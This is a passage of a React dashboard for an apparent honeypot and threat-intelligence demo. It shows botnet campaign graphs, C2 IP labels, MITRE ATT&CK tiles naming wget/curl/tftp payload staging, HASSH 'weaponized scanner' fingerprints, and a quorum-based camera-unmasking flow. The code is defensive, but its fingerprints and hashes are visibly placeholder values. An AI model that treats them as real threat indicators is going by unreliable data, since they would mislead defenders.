              <div className="graph-legend">
                <span className="legend-item">
                  <span className="legend-dot campaign" /> Campaign Cluster Hub
                </span>
                <span className="legend-item">
                  <span className="legend-dot session" /> Decoy Session
                </span>
                <span className="legend-item">
                  <span className="legend-dot threat" /> Honeytoken Hit
                </span>
              </div>
              <div style={{ display: 'flex', gap: '0.5rem' }}>
                <button
                  type="button"
                  className="btn-drill"
                  onClick={handleOpenSTIX}
                  style={{ fontSize: '0.75rem', padding: '0.3rem 0.65rem' }}
                >
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
                    <polyline points="7 10 12 15 17 10" />
                    <line x1="12" y1="15" x2="12" y2="3" />
                  </svg>
                  <span>View / Export STIX 2.1</span>
                </button>
              </div>
            </div>

            <div className="svg-canvas-wrapper">
              <svg ref={graphContainerRef} width="100%" height="100%" viewBox="0 0 700 480">
                <defs>
                  <filter id="glow-campaign" x="-50%" y="-50%" width="200%" height="200%">
                    <feDropShadow dx="0" dy="0" stdDeviation="6" floodColor="#f59e0b" floodOpacity="0.6" />
                  </filter>
                  <filter id="glow-threat" x="-50%" y="-50%" width="200%" height="200%">
                    <feDropShadow dx="0" dy="0" stdDeviation="6" floodColor="#f43f5e" floodOpacity="0.7" />
                  </filter>
                  <filter id="glow-session" x="-50%" y="-50%" width="200%" height="200%">
                    <feDropShadow dx="0" dy="0" stdDeviation="4" floodColor="#38bdf8" floodOpacity="0.5" />
                  </filter>
                </defs>

                {/* Edges */}
                <line x1="200" y1="160" x2="90" y2="80" className="edge-line" />
                <line x1="200" y1="160" x2="90" y2="240" className="edge-line" />
                <line x1="200" y1="160" x2="310" y2="100" className="edge-line" />

                <line x1="90" y1="80" x2="90" y2="240" className="edge-line strong" />
                <text x="50" y="160" className="edge-label-text">
                  Shared C2 (185.220.101.5)
                </text>

                <line x1="90" y1="80" x2="310" y2="100" className="edge-line strong" />
                <text x="210" y="70" className="edge-label-text">
                  Attacker IP Rotation Linked via C2
                </text>

                <line x1="520" y1="280" x2="440" y2="380" className="edge-line" />
                <line x1="520" y1="280" x2="600" y2="380" className="edge-line" />
                <line x1="440" y1="380" x2="600" y2="380" className="edge-line strong" />
                <text x="520" y="405" className="edge-label-text">
                  Same SCADA Exploit & C2 (93.184.216.34)
                </text>

                <line x1="480" y1="90" x2="580" y2="100" className="edge-line" />

                {/* Nodes */}
                <g
                  className={`graph-node ${selectedCampaignId === 'CMP-001' ? 'selected' : ''}`}
                  onClick={() => setSelectedCampaignId('CMP-001')}
                  transform="translate(200, 160)"
                >
                  <circle r="26" fill="#f59e0b" filter="url(#glow-campaign)" />
                  <text y="4" textAnchor="middle" fill="#000" fontWeight="700" fontSize="10">
                    CMP-001
                  </text>
                  <text y="40" textAnchor="middle" fill="#fbbf24" fontSize="11" fontWeight="600">
                    Mirai IoT Botnet
                  </text>
                </g>

                <g
                  className={`graph-node ${selectedSessionId === 'sess-mirai-01' ? 'selected' : ''}`}
                  onClick={() => {
                    setSelectedSessionId('sess-mirai-01')
                    setSelectedCampaignId('CMP-001')
                  }}
                  transform="translate(90, 80)"
                >
                  <circle r="18" fill="#f43f5e" filter="url(#glow-threat)" />
                  <text y="3" textAnchor="middle" fill="#fff" fontSize="8" fontWeight="600">
                    S1
                  </text>
                  <text y="28" textAnchor="middle" fill="#cbd5e1" fontSize="9">
                    198.51.100.44
                  </text>
                </g>

                <g
                  className={`graph-node ${selectedSessionId === 'sess-mirai-02' ? 'selected' : ''}`}
                  onClick={() => {
                    setSelectedSessionId('sess-mirai-02')
                    setSelectedCampaignId('CMP-001')
                  }}
                  transform="translate(90, 240)"
                >
                  <circle r="18" fill="#f43f5e" filter="url(#glow-threat)" />
                  <text y="3" textAnchor="middle" fill="#fff" fontSize="8" fontWeight="600">
                    S2
                  </text>
                  <text y="28" textAnchor="middle" fill="#cbd5e1" fontSize="9">
                    198.51.100.72
                  </text>
                </g>

                <g
                  className={`graph-node ${selectedSessionId === 'sess-mirai-03-adapted' ? 'selected' : ''}`}
                  onClick={() => {
                    setSelectedSessionId('sess-mirai-03-adapted')
                    setSelectedCampaignId('CMP-001')
                  }}
                  transform="translate(310, 100)"
                >
                  <circle r="17" fill="#38bdf8" filter="url(#glow-session)" />
                  <text y="3" textAnchor="middle" fill="#000" fontSize="8" fontWeight="600">
                    S3
                  </text>
                  <text y="28" textAnchor="middle" fill="#38bdf8" fontSize="9">
                    203.0.113.88 (Adapted)
                  </text>
                </g>

                <g
                  className={`graph-node ${selectedCampaignId === 'CMP-002' ? 'selected' : ''}`}
                  onClick={() => setSelectedCampaignId('CMP-002')}
                  transform="translate(520, 280)"
                >
                  <circle r="26" fill="#f59e0b" filter="url(#glow-campaign)" />
                  <text y="4" textAnchor="middle" fill="#000" fontWeight="700" fontSize="10">
                    CMP-002
                  </text>
                  <text y="40" textAnchor="middle" fill="#fbbf24" fontSize="11" fontWeight="600">
                    Substation RTU Attack
                  </text>
                </g>

                <g
                  className={`graph-node ${selectedSessionId === 'sess-scada-01' ? 'selected' : ''}`}
                  onClick={() => {
                    setSelectedSessionId('sess-scada-01')
                    setSelectedCampaignId('CMP-002')
                  }}
                  transform="translate(440, 380)"
                >
                  <circle r="18" fill="#f43f5e" filter="url(#glow-threat)" />
                  <text y="3" textAnchor="middle" fill="#fff" fontSize="8" fontWeight="600">
                    SC1
                  </text>
                  <text y="28" textAnchor="middle" fill="#cbd5e1" fontSize="9">
                    192.0.2.140
                  </text>
                </g>

                <g
                  className={`graph-node ${selectedSessionId === 'sess-scada-02' ? 'selected' : ''}`}
                  onClick={() => {
                    setSelectedSessionId('sess-scada-02')
                    setSelectedCampaignId('CMP-002')
                  }}
                  transform="translate(600, 380)"
                >
                  <circle r="18" fill="#f43f5e" filter="url(#glow-threat)" />
                  <text y="3" textAnchor="middle" fill="#fff" fontSize="8" fontWeight="600">
                    SC2
                  </text>
                  <text y="28" textAnchor="middle" fill="#cbd5e1" fontSize="9">
                    192.0.2.141
                  </text>
                </g>

                <g
                  className={`graph-node ${selectedCampaignId === 'CMP-003' ? 'selected' : ''}`}
                  onClick={() => setSelectedCampaignId('CMP-003')}
                  transform="translate(480, 90)"
                >
                  <circle r="20" fill="#64748b" />
                  <text y="4" textAnchor="middle" fill="#fff" fontWeight="700" fontSize="9">
                    CMP-003
                  </text>
                  <text y="34" textAnchor="middle" fill="#94a3b8" fontSize="10">
                    Generic Scanner
                  </text>
                </g>

                <g
                  className={`graph-node ${selectedSessionId === 'sess-scanner-01' ? 'selected' : ''}`}
                  onClick={() => {
                    setSelectedSessionId('sess-scanner-01')
                    setSelectedCampaignId('CMP-003')
                  }}
                  transform="translate(580, 100)"
                >
                  <circle r="15" fill="#38bdf8" filter="url(#glow-session)" />
                  <text y="3" textAnchor="middle" fill="#000" fontSize="8">
                    SCN
                  </text>
                  <text y="25" textAnchor="middle" fill="#94a3b8" fontSize="9">
                    198.51.100.44
                  </text>
                </g>
              </svg>
            </div>
          </div>

          {/* Inspector Drawer */}
          <div className="inspector-card">
            <div className="inspector-header">
              <div>
                <span className="field-label">Inspector Detail</span>
                <h3 style={{ fontSize: '1rem', color: '#fff' }}>{activeSession ? activeSession.session_id : activeCampaign?.campaign_id}</h3>
              </div>
              <span className={`status-chip ${activeCampaign?.risk_level === 'high' ? 'denied' : 'pending'}`}>
                {activeCampaign?.risk_level.toUpperCase()} RISK
              </span>
            </div>

            <div className="inspector-body">
              {activeCampaign && (
                <div style={{ background: 'rgba(255, 255, 255, 0.03)', padding: '0.75rem', borderRadius: 'var(--radius-sm)' }}>
                  <div className="field-label">Linked Campaign</div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '0.2rem' }}>
                    <span style={{ fontWeight: 600, color: '#fbbf24' }}>{activeCampaign.campaign_id}</span>
                    <span style={{ fontSize: '0.75rem', color: '#94a3b8' }}>Confidence: {activeCampaign.confidence}</span>
                  </div>
                  <div style={{ fontSize: '0.75rem', color: '#cbd5e1', marginTop: '0.4rem' }}>
                    {activeCampaign.evidence_reasons[0]}
                  </div>
                </div>
              )}

              {/* Blast Radius Assessment */}
              <div className="field-group">
                <span className="field-label">Blast-Radius Score</span>
                <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                  <span className="code-pill">
                    {activeSession?.target_device === 'substation'
                      ? '3.5x Multiplier (Substation RTU)'
                      : activeSession?.target_device === 'traffic_controller'
                      ? '2.0x Multiplier (Traffic Controller)'
                      : '1.0x Multiplier (Camera Node)'}
                  </span>
                </div>
              </div>

              {/* Source IP & Service */}
              <div className="field-group">
                <span className="field-label">Source IP & Honeypot Service</span>
                <div className="field-value">
                  <code>{activeSession?.source_ip}</code> on port 22 ({activeSession?.service.toUpperCase()})
                </div>
              </div>

              {/* HASSH Fingerprint Quick Badge */}
              {activeSession?.hassh && (
                <div className="field-group">
                  <span className="field-label">HASSH Fingerprint Profile</span>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '0.3rem' }}>
                    <span className="code-pill" style={{ color: activeSession.hassh.weaponized ? '#fb7185' : '#38bdf8' }}>
                      {activeSession.hassh.threat_profile}
                    </span>
                    <span style={{ fontSize: '0.7rem', fontFamily: 'var(--font-mono)', color: '#64748b' }}>
                      MD5: {activeSession.hassh.hassh}
                    </span>
                  </div>
                </div>
              )}

              {/* Honeytoken Status */}
              <div className="field-group">
                <span className="field-label">Tripwire / Honeytoken Hit</span>
                <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                  {activeSession?.honeytoken_hit ? (
                    <span className="status-chip denied">● TRIPWIRE TRIPPED (Rickroll Fired)</span>
                  ) : (
                    <span className="status-chip approved">CLEAN / NO TRIPWIRE</span>
                  )}
                </div>
              </div>

              {/* C2 Address */}
              {activeSession?.c2_address && (
                <div className="field-group">
                  <span className="field-label">Command & Control (C2) Server</span>
                  <div className="field-value">
                    <span className="code-pill" style={{ color: '#fb7185', borderColor: 'rgba(244, 63, 94, 0.3)' }}>
                      {activeSession.c2_address}
                    </span>
                  </div>
                </div>
              )}

              {/* Malware Hash */}
              {activeSession?.malware_hash && (
                <div className="field-group">
                  <span className="field-label">Malware Binary SHA-256</span>
                  <div className="field-value" style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', color: '#94a3b8' }}>
                    {activeSession.malware_hash.substring(0, 28)}...
                  </div>
                </div>
              )}

              {/* Terminal Command Sequence */}
              <div className="field-group">
                <span className="field-label">Captured Attacker Commands</span>
                <div className="terminal-box">
                  {activeSession?.commands.map((cmd, idx) => (
                    <div key={idx} className="terminal-line">
                      <span className="terminal-prompt">$</span>
                      <span>{cmd}</span>
                    </div>
                  ))}
                  {activeSession?.commands.length === 0 && <span style={{ color: '#64748b' }}>No commands entered</span>}
                </div>
              </div>

              {/* MITRE ATT&CK Badges */}
              {activeSession?.mitre_tags && activeSession.mitre_tags.length > 0 && (
                <div className="field-group">
                  <span className="field-label">MITRE ATT&CK Mappings</span>
                  <div className="mitre-badge-row">
                    {activeSession.mitre_tags.map((tag) => (
                      <span key={tag.id} className="mitre-badge" title={`${tag.name} (${tag.tactic})`}>
                        {tag.id} - {tag.name}
                      </span>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB 2: BREAK-GLASS ESCROW & CUSTODIAN QUORUM                       */}
      {/* =================================================================== */}
      {activeSubTab === 'escrow' && (
        <div className="escrow-grid">
          <div className="cases-list-card">
            <div className="card-title-bar">
              <h3>Break-Glass Warrants</h3>
              <span className="field-label">{cases.length} Total</span>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
              {cases.map((c) => (
                <button
                  key={c.case_id}
                  type="button"
                  className={`case-item-button ${selectedCaseId === c.case_id ? 'active' : ''}`}
                  onClick={() => setSelectedCaseId(c.case_id)}
                >
                  <div className="case-item-top">
                    <span className="case-id-text">{c.case_id}</span>
                    <span className={`status-chip ${c.status}`}>{c.status}</span>
                  </div>
                  <div style={{ fontSize: '0.775rem', color: '#94a3b8' }}>
                    Camera: <strong>{c.camera_id}</strong>
                  </div>
                  <div style={{ fontSize: '0.725rem', color: '#64748b', display: 'flex', justifyContent: 'space-between' }}>
                    <span>Window: {c.window_id}</span>
                    <span>{c.approvals.length}/2 Approvals</span>
                  </div>
                </button>
              ))}
            </div>

            <div style={{ marginTop: 'auto', paddingTop: '1rem', borderTop: '1px solid var(--border-subtle)' }}>
              <button
                type="button"
                className="btn-drill btn-drill-a"
                style={{ width: '100%', justifyContent: 'center' }}
                onClick={handleRunDrillA}
              >
                <span>Simulate Unauthorized Pedestrian Unmask</span>
              </button>
              <p style={{ fontSize: '0.725rem', color: '#94a3b8', marginTop: '0.4rem', textAlign: 'center' }}>
                Demonstrates Drill A: Operator denied without honeypot hostility; incident written to audit log.
              </p>
            </div>
          </div>

          <div className="case-detail-card">
            <div className="card-title-bar">
              <div>
                <span className="field-label">Selected Warrant</span>
                <h3 style={{ fontSize: '1.25rem' }}>{activeCase?.case_id}</h3>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                <span className="code-pill">{activeCase?.camera_id}</span>
                <span className="code-pill">{activeCase?.window_id}</span>
              </div>
            </div>

            <div className="quorum-tracker">
              <div>
                <div style={{ fontSize: '0.8rem', fontWeight: 600, color: '#fff' }}>
                  Shamir 2-of-3 Quorum: {activeCase?.approvals.length} of 2 approvals recorded
                </div>
                <div style={{ fontSize: '0.75rem', color: '#94a3b8' }}>
                  {activeCase?.status === 'approved'
                    ? 'Quorum reached! Scoped AES-256 decryption key reconstructed.'
                    : 'Awaiting minimum 2 custodian approvals to reconstruct key.'}
                </div>
              </div>
              <div style={{ width: '140px' }}>
                <div className="quorum-progress-bar-bg">
                  <div
                    className="quorum-progress-fill"
                    style={{ width: `${Math.min(100, ((activeCase?.approvals.length || 0) / 2) * 100)}%` }}
                  />
                </div>
              </div>
            </div>

            <div>
              <span className="field-label" style={{ marginBottom: '0.5rem', display: 'block' }}>
                Designated Municipal Custodians (Independent Quorum)
              </span>
              <div className="custodians-grid">
                {custodians.map((custodian) => {
                  const hasApproved = activeCase?.approvals.includes(custodian.id)
                  return (
                    <div key={custodian.id} className={`custodian-card ${hasApproved ? 'has-voted-approve' : ''}`}>
                      <div className="custodian-header">
                        <div className="custodian-avatar">{custodian.avatar_badge}</div>
                        <div>
                          <div className="custodian-name">{custodian.name}</div>
                          <div className="custodian-role">{custodian.role}</div>
                        </div>
                      </div>

                      <div style={{ fontSize: '0.725rem', color: '#64748b' }}>
                        Share #{custodian.share_index} of Shamir polynomial
                      </div>

                      <div className="vote-actions">
                        <button
                          type="button"
                          className="btn-vote-approve"
                          disabled={hasApproved || activeCase?.status === 'approved'}
                          onClick={() => handleVote(custodian.id, 'approve')}
                        >
                          {hasApproved ? '✓ Approved' : 'Approve Warrant'}
                        </button>
                        <button
                          type="button"
                          className="btn-vote-deny"
                          disabled={hasApproved || activeCase?.status === 'approved'}
                          onClick={() => handleVote(custodian.id, 'deny')}
                        >
                          Deny
                        </button>
                      </div>
                    </div>
                  )
                })}
              </div>
            </div>

            {activeCase?.status === 'approved' && (
              <div className="unmasked-key-card">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="2">
                      <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                      <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                    </svg>
                    <strong style={{ fontSize: '0.9rem', color: '#34d399' }}>
                      Warrant Approved: Scoped Decryption Key Unlocked
                    </strong>
                  </div>
                  <span className="code-pill" style={{ color: '#34d399', borderColor: 'rgba(16, 185, 129, 0.4)' }}>
                    Shamir 2-of-3 Quorum Verified
                  </span>
                </div>

                <div style={{ fontSize: '0.775rem', color: '#e2e8f0', wordBreak: 'break-all' }}>
                  <strong>Reconstructed AES-256-GCM Key:</strong>{' '}
                  <code style={{ color: '#34d399' }}>{revealedFootageKey || 'd8f3b490c2914102983719028341908239018239018230918209381029381029'}</code>
                </div>

                <div className="footage-unmask-preview">
                  <div className="footage-box blurred">
                    <div className="face-placeholder-blurred" />
                    <span className="footage-tag">Default City Feed: Blurred (Privacy Preserved)</span>
                  </div>

                  <div className="footage-box">
                    <div className="face-placeholder-unmasked">👤</div>
                    <span className="footage-tag" style={{ color: '#34d399' }}>
                      Scoped Unmask: {activeCase.camera_id} [{activeCase.window_id}]
                    </span>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB 3: CRYPTOGRAPHIC HASH-CHAINED AUDIT TRAIL                       */}
      {/* =================================================================== */}
      {activeSubTab === 'audit' && (
        <div className="audit-container">
          <div className="audit-control-bar">
            <div>
              <span className="field-label">Immutable Cryptographic Ledger</span>
              <h3 style={{ fontSize: '1.05rem', color: '#fff' }}>SHA-256 Hash-Chained Append-Only Trail</h3>
            </div>

            <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
              {auditVerified !== null && (
                <span className="status-chip approved">
                  ✓ {auditVerified ? 'Chain Valid (0 Tampered Blocks)' : 'Integrity Error'}
                </span>
              )}
              <button
                type="button"
                className="btn-verify-audit"
                onClick={handleVerifyAuditChain}
                disabled={isVerifyingChain}
              >
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                <span>{isVerifyingChain ? 'Verifying Hashes...' : 'Verify Hash Chain Integrity'}</span>
              </button>
            </div>
          </div>

          <div className="audit-table-card">
            <table className="audit-table">
              <thead>
                <tr>
                  <th>Index</th>
                  <th>Timestamp</th>
                  <th>Action</th>
                  <th>Actor</th>
                  <th>Scope</th>
                  <th>Details</th>
                  <th>Block Hash / Link</th>
                </tr>
              </thead>
              <tbody>
                {auditLogs.map((log) => (
                  <tr key={log.index}>
                    <td style={{ fontFamily: 'var(--font-mono)', fontWeight: 600 }}>#{log.index}</td>
                    <td style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)' }}>
                      {log.timestamp.replace('T', ' ').substring(0, 19)}
                    </td>
                    <td>
                      <span className={`audit-action-chip ${log.action}`}>{log.action}</span>
                    </td>
                    <td style={{ fontFamily: 'var(--font-mono)', fontSize: '0.775rem' }}>{log.actor}</td>
                    <td style={{ fontSize: '0.75rem' }}>
                      {log.camera_id ? (
                        <code>
                          {log.camera_id} @ {log.window_id}
                        </code>
                      ) : (
                        <span style={{ color: '#64748b' }}>System Enclave</span>
                      )}
                    </td>
                    <td style={{ maxWidth: '320px', lineHeight: 1.4, fontSize: '0.775rem' }}>{log.details}</td>
                    <td>
                      <span className="hash-link-code" title={`Full Hash: ${log.current_hash}\nPrev: ${log.prev_hash}`}>
                        {log.current_hash.substring(0, 12)}...
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* =================================================================== */}
      {/* STRETCH TAB 4: HASSH & MITRE ATT&CK MATRIX                          */}
      {/* =================================================================== */}
      {activeSubTab === 'mitre_hassh' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>
          {/* MITRE ATT&CK Matrix Grid */}
          <div className="tactic-column" style={{ padding: '1rem', gap: '0.75rem' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <div>
                <span className="field-label">MITRE ATT&CK Framework</span>
                <h3 style={{ fontSize: '1.1rem', color: '#fff' }}>Enterprise IoT Threat Technique Matrix</h3>
              </div>
              <span className="code-pill">7 Techniques Active Across Captured Honeypot Sessions</span>
            </div>

            <div className="mitre-matrix-grid">
              <div className="tactic-column">
                <div className="tactic-header">Credential Access</div>
                <div className="technique-item active">
                  <span className="technique-id-badge">T1110.001</span>
                  <span className="technique-name">Password Guessing</span>
                  <p style={{ fontSize: '0.72rem', color: '#94a3b8' }}>Brute-forcing default credentials on IoT ports</p>
                  <span className="technique-count-pill">3 Sessions</span>
                </div>
                <div className="technique-item active">
                  <span className="technique-id-badge">T1078</span>
                  <span className="technique-name">Valid Accounts</span>
                  <p style={{ fontSize: '0.72rem', color: '#94a3b8' }}>Factory default camera logins</p>
                  <span className="technique-count-pill">2 Sessions</span>
                </div>
              </div>

              <div className="tactic-column">
                <div className="tactic-header">Execution</div>
                <div className="technique-item active">
                  <span className="technique-id-badge">T1059.004</span>
                  <span className="technique-name">Unix Shell Execution</span>
                  <p style={{ fontSize: '0.72rem', color: '#94a3b8' }}>Executing bash/busybox droppers in decoy</p>
                  <span className="technique-count-pill">5 Sessions</span>
                </div>
              </div>

              <div className="tactic-column">
                <div className="tactic-header">Command & Control</div>
                <div className="technique-item active">
                  <span className="technique-id-badge">T1071.001</span>
                  <span className="technique-name">Web Protocols (C2)</span>
                  <p style={{ fontSize: '0.72rem', color: '#94a3b8' }}>Beaconing to remote C2 IP (185.220.101.5)</p>
                  <span className="technique-count-pill">4 Sessions</span>
                </div>
                <div className="technique-item active">
                  <span className="technique-id-badge">T1105</span>
                  <span className="technique-name">Ingress Tool Transfer</span>
                  <p style={{ fontSize: '0.72rem', color: '#94a3b8' }}>Payload staged via wget/curl/tftp</p>
                  <span className="technique-count-pill">4 Sessions</span>
                </div>
              </div>

              <div className="tactic-column">
                <div className="tactic-header">Impact</div>
                <div className="technique-item active">
                  <span className="technique-id-badge">T1499</span>
                  <span className="technique-name">Endpoint Denial of Service</span>
                  <p style={{ fontSize: '0.72rem', color: '#94a3b8' }}>Mirai botnet orchestration telemetry</p>
                  <span className="technique-count-pill">4 Sessions</span>
                </div>
              </div>
            </div>
          </div>

          {/* Salesforce HASSH SSH Client Fingerprinting Decoder */}
          <div className="hassh-table-card">
            <div>
              <span className="field-label">Salesforce HASSH Specification</span>
              <h3 style={{ fontSize: '1.1rem', color: '#fff' }}>SSH Client Fingerprint Signatures</h3>
              <p style={{ fontSize: '0.8rem', color: '#94a3b8', marginTop: '0.2rem' }}>
                <code>hassh = MD5(kex + ";" + encryption + ";" + mac + ";" + compression)</code>. Weaponized scanning tools exhibit identifiable cryptographic cipher negotiation signatures.
              </p>
            </div>

            <div className="hassh-card-grid">
              <div className="hassh-card">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <span className="hassh-weaponized-badge">Weaponized Botnet Scanner</span>
                  <span style={{ fontSize: '0.75rem', color: '#f59e0b' }}>Confidence: High</span>
                </div>
                <div style={{ fontWeight: 600, color: '#fff', fontSize: '0.9rem' }}>Mirai / Echobot Weaponized Go Scanner</div>
                <div style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', color: '#38bdf8' }}>
                  HASSH: 9a4f21d3e8105c938192a01491823091
                </div>
                <div style={{ fontSize: '0.75rem', color: '#94a3b8' }}>
                  Banner: <code>SSH-2.0-Go-crypto-ssh</code>
                </div>
                <div style={{ fontSize: '0.72rem', color: '#64748b' }}>
                  Ciphers: chacha20-poly1305@openssh.com, aes128-ctr | MAC: hmac-sha2-256-etm
                </div>
              </div>

              <div className="hassh-card">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <span className="hassh-weaponized-badge">SCADA Industrial Exploit</span>
                  <span style={{ fontSize: '0.75rem', color: '#f43f5e' }}>Confidence: Critical</span>
                </div>
                <div style={{ fontWeight: 600, color: '#fff', fontSize: '0.9rem' }}>BlackEnergy SCADA Industrial Brute-Forcer</div>
                <div style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', color: '#38bdf8' }}>
                  HASSH: cc129a04918239018230918230198230
                </div>
                <div style={{ fontSize: '0.75rem', color: '#94a3b8' }}>
                  Banner: <code>SSH-2.0-libssh_0.9.5</code>
                </div>
                <div style={{ fontSize: '0.72rem', color: '#64748b' }}>
                  Ciphers: aes256-gcm@openssh.com, aes128-gcm | KEX: curve25519-sha256@libssh.org
                </div>
              </div>

              <div className="hassh-card">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <span className="code-pill">Dual-Use / Scanner</span>
                  <span style={{ fontSize: '0.75rem', color: '#94a3b8' }}>Confidence: Low</span>
                </div>
                <div style={{ fontWeight: 600, color: '#fff', fontSize: '0.9rem' }}>Standard OpenSSH Distribution</div>
                <div style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', color: '#94a3b8' }}>
                  HASSH: b2940182309182309182093810293810
                </div>
                <div style={{ fontSize: '0.75rem', color: '#94a3b8' }}>
                  Banner: <code>SSH-2.0-OpenSSH_8.9p1 Ubuntu</code>
                </div>
                <div style={{ fontSize: '0.72rem', color: '#64748b' }}>
                  Ciphers: chacha20-poly1305, aes128-gcm | Standard legitimate Linux client
                </div>
              </div>
            </div>
          </div>
        </div>
      )}


      {/* =================================================================== */}
      {/* STRETCH TAB 6: CROSS-CITY THREAT FEDERATION (SMART CONTRACT)        */}
      {/* =================================================================== */}
      {activeSubTab === 'federation' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>
          {/* Smart Contract Hero Grid */}
          <div className="federation-hero">
            <div className="city-node-card">
              <span className="field-label" style={{ color: '#38bdf8' }}>Originating Municipality</span>
              <h3 style={{ fontSize: '1.05rem', color: '#fff' }}>City A (Neo-Pune ICCC)</h3>
              <p style={{ fontSize: '0.78rem', color: '#94a3b8' }}>
                Detects Mirai campaign CMP-001 targeting local traffic sensors. Publishes threat signature to testnet contract.
              </p>
              <button
                type="button"
                className="btn-drill btn-drill-c"
                style={{ marginTop: '0.5rem' }}
                onClick={handlePublishToFederation}
              >
                <span>Publish Threat Hash to Smart Contract</span>
              </button>
            </div>

            <div className="contract-sync-hub">
              <div className="chain-block-cube">⛓️</div>
              <span style={{ fontSize: '0.75rem', fontWeight: 600, color: '#38bdf8' }}>Polygon Testnet</span>
              <code style={{ fontSize: '0.7rem' }}>0x71C2...A89F</code>
            </div>

            <div className="city-node-card">
              <span className="field-label" style={{ color: '#fbbf24' }}>Federated Consumer</span>
              <h3 style={{ fontSize: '1.05rem', color: '#fff' }}>City B (Cyber-Bengaluru ICCC)</h3>
              <p style={{ fontSize: '0.78rem', color: '#94a3b8' }}>
                Monitors on-chain registry. Automatically pre-routes recognized botnet probes to Phantom Twin decoys!
              </p>
              <button
                type="button"
                className="btn-drill btn-drill-b"
                style={{ marginTop: '0.5rem' }}
                onClick={handleSimulateCityBAttack}
              >
                <span>Simulate City B Preemptive Neutralization</span>
              </button>
            </div>
          </div>

          {/* On-Chain Ledger Table */}
          <div className="audit-table-card">
            <div style={{ padding: '0.85rem 1.25rem', borderBottom: '1px solid var(--border-subtle)' }}>
              <span className="field-label">Decentralized Threat Registry</span>
              <h3 style={{ fontSize: '1rem', color: '#fff' }}>Smart Contract Transaction Ledger</h3>
            </div>
            <table className="audit-table">
              <thead>
                <tr>
                  <th>Block #</th>
                  <th>Timestamp</th>
                  <th>Submitting Node</th>
                  <th>Campaign ID</th>
                  <th>Shared C2 / Malware Hash</th>
                  <th>Status</th>
                  <th>Tx Hash</th>
                </tr>
              </thead>
              <tbody>
                {federatedRecords.map((r, idx) => (
                  <tr key={idx}>
                    <td style={{ fontFamily: 'var(--font-mono)', fontWeight: 600 }}>#{r.block_number}</td>
                    <td style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)' }}>
                      {r.timestamp.replace('T', ' ').substring(0, 19)}
                    </td>
                    <td>{r.submitting_city}</td>
                    <td>
                      <span className="code-pill">{r.campaign_id}</span>
                    </td>
                    <td style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)' }}>
                      {r.c2_address ? `C2: ${r.c2_address}` : `Malware: ${r.malware_hash?.substring(0, 16)}...`}
                    </td>
                    <td>
                      <span className="status-chip approved">{r.status}</span>
                    </td>
                    <td>
                      <span className="hash-link-code">{r.tx_hash.substring(0, 14)}...</span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          {/* City B Prevented Attacks Log */}
          {cityBPreventions.length > 0 && (
            <div className="audit-table-card" style={{ borderColor: 'rgba(56, 189, 248, 0.4)' }}>
              <div style={{ padding: '0.85rem 1.25rem', borderBottom: '1px solid var(--border-subtle)' }}>
                <span className="field-label" style={{ color: '#38bdf8' }}>City B Live Telemetry</span>
                <h3 style={{ fontSize: '1rem', color: '#fff' }}>Neutralized Multi-City Attacks</h3>
              </div>
              <div style={{ padding: '1rem 1.25rem', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
                {cityBPreventions.map((p, i) => (
                  <div
                    key={i}
                    style={{
                      padding: '0.75rem 1rem',
                      background: 'rgba(56, 189, 248, 0.08)',
                      borderRadius: 'var(--radius-md)',
                      border: '1px solid rgba(56, 189, 248, 0.25)',
                      display: 'flex',
                      justifyContent: 'space-between',
                      alignItems: 'center',
                    }}
                  >
                    <div>
                      <strong style={{ color: '#38bdf8', fontSize: '0.85rem' }}>{p.incident_id}</strong>
                      <span style={{ color: '#cbd5e1', fontSize: '0.8rem', marginLeft: '0.5rem' }}>{p.reason}</span>
                    </div>
                    <span className="status-chip approved">Preemptive Decoy Routed</span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* =================================================================== */}
      {/* TAB 7: CHRONOFORGE DEMO SCRIPT GUIDE                                */}
      {/* =================================================================== */}
      {activeSubTab === 'guide' && (
        <div className="script-guide-container">
          <div className="drill-guide-card">
            <h4>
              <span className="status-chip denied">DRILL A</span> False Positive Pedestrian Protection
